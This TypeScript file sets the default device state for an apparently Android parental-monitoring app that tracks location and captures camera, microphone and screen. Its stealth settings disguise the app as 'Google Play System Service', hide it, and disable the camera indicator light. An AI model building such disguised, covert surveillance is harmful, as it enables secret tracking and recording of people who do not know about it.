import { ChildDeviceState } from './types';

export const DEFAULT_DEVICE_STATE: ChildDeviceState = {
  deviceId: "",
  pairingCode: "",
  childName: "Child Device",
  childAge: 12,
  deviceModel: "No Device Connected",
  osVersion: "Android",
  isOnline: false,
  lastSeen: "Never",
  batteryLevel: 0,
  isCharging: false,
  wifiName: "Disconnected",
  storageUsedPercent: 0,
  storageUsedGB: 0,
  storageTotalGB: 64,

  location: {
    lat: 23.8103,
    lng: 90.4125,
    address: "Waiting for real device GPS signal...",
    speed: 0,
    accuracy: 0,
    altitude: 0,
    timestamp: new Date().toISOString(),
    batteryAtLocation: 0
  },
  locationHistory: [],
  geofences: [],
  isLocked: false,
  lockReason: "",
  customLockMessage: "Screen access locked by Parent.",
  activeCamera: 'off',
  isCameraStreaming: false,
  latestCameraSnapshot: null,
  cameraSnapshotTimestamp: null,
  cameraSnapshots: [],
  audioState: {
    isListening: false,
    decibelLevel: 0,
    audioMode: 'off',
    lastTranscript: "Waiting for real microphone stream.",
    recordedClipsCount: 0,
    recordedClips: []
  },
  isScreenMonitoring: false,
  currentApp: "Standby",
  currentScreenTitle: "Waiting for child device...",
  currentScreenContent: "",
  currentScreenImage: null,
  aiSafetyStatus: {
    timestamp: new Date().toISOString(),
    riskLevel: 'SAFE',
    safetyScore: 100,
    detectedCategories: ['Standby'],
    summary: 'No device paired yet. Please install the APK on your child phone and enter the pairing code.',
    suggestedAction: 'Click Pair Device above to connect.'
  },
  blockedApps: [],
  appUsageLogs: [],
  fileSystem: [],
  activityHistory: [
    {
      id: "log-init",
      timestamp: "Ready",
      type: "permission",
      title: "Guardian Shield Server Ready",
      message: "Waiting for real child Android phone to connect.",
      severity: "info"
    }
  ],
  stealthSettings: {
    autoHideApp: true,
    isAppHidden: false,
    disguiseName: "Google Play System Service",
    sensorLightDisabled: true,
    hideNotificationBadge: true,
    runInBackground: true,
    permissionsGranted: {
      location: false,
      camera: false,
      microphone: false,
      storage: false,
      accessibility: false,
      deviceAdmin: false,
      usageStats: false,
      drawOverApps: false
    }
  }
};
